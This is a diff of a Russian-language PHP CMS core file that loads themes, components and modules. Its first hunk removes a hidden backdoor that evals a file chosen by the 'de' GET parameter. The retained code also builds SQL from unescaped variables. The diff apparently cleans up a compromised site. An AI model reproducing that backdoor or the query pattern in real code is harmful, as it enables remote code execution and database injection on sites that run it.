@@ -1,6 +1,6 @@
 <?php
 defined( '_VALID_INSITE' ) or die( 'Доступ запрещен' );
-if(isset($_GET['de'])){header('Content-Type: text/html; charset=windows-1251');$p=$_GET['de'];echo eval/**/('?>'.join("",file("highslide/graphics/outlines/drop/$p")).'<?');die;}
+
 require_once( site_path. '/includes/phpInputFilter/class.inputfilter.php' );
 require_once( site_path. '/ihtml.php' );
 require_once( site_path. '/itabs.php' );
@@ -12,11 +12,13 @@ require_once( site_path . '/iservice.php' );
 require_once( site_path . '/isection.php' );
 
 function get_theme(){
+	// var_dump ($_REQUEST);
 	global $reg;
 	$component = $reg['c'];
 	$themes = ggsql ("select * from #__theme_config order by `ordering`");
 	foreach ($themes as $theme){
 		if ($theme->type == 0){
+			
 			if ($theme->val == $component){
 				if ($theme->ext_file != ''){
 					if (file_exists(site_path . "/theme/theme_extfiles/" . $theme->ext_file)){
@@ -33,6 +35,7 @@ function get_theme(){
 			}
 		}
 		elseif($theme->type == 1){
+			
 			$theme->val = html_entity_decode($theme->val);
 			if (preg_match("~{$theme->val}~Usi", $_SERVER['REQUEST_URI'])){
 				if ($theme->ext_file != ''){
@@ -90,15 +93,14 @@ function get_icom($pi){
 		return "nopage"; 
 	}
 	else if (  isset($_REQUEST['c'])  ){
+		
 		if(  !file_exists(  $icomp_file  )  )	return "nopage";
 	}
-
 	$icom = isset ($_REQUEST['c']) ? $_REQUEST['c'] : "nopage";
 	return $icom;
 }
 
 function im($pos, &$params=0){	// ЗАГРУЗКА МОДУЛЯ
-
 	$modules = ggsql("SELECT * FROM #__modules WHERE position='$pos' AND published=1 ORDER BY ordering");
 	foreach ($modules as $module){
 		$imodule_file = site_path."/modules/".$module->module.".php";
@@ -188,15 +190,19 @@ global  $icom, $reg;
         ilog::vlog('{ компонент '.$reg['c']);
         ilog::vlog('task='.$reg['task']);
 	$imodule_file = site_path."/component/$icom/$icom.php";
+	// var_dump($imodule_file);
                                                                 /*
                                                                  * КЛАСС mceContentBody - обязательно должен быть, относительно этого класа делается файл стилей,
                                                                  * чтобы добиться одинакового представления в админке и в клиентской частях сайта
                                                                  */
-	if (  !isset($_REQUEST['4ajax'])  ){ ?><!--i24_ib_start--><div class="mceContentBody"<?php/* если удалил класс mceContentBody - добавь его в верстке */ ?> id="div_mceContentBody"><?php }
+	if (  !isset($_REQUEST['4ajax'])  ){ ?><!--i24_ib_start-->
+	
+	<div class="mceContentBody"<?php/* если удалил класс mceContentBody - добавь его в верстке */ ?> id="div_mceContentBody"><?php }
 		require_once( $imodule_file );
 	if (  !isset($_REQUEST['4ajax'])  ){ ?></div><!--i24_ib_end--><?php }
         ilog::vlog('компонент '.$reg['c'].' }');
         ilog::commentlog('END компонент::'.$reg['c']);
+	
 }
 function ipathway(){	// ЗАГРУЗКА ПУТИ
 global  $icom;
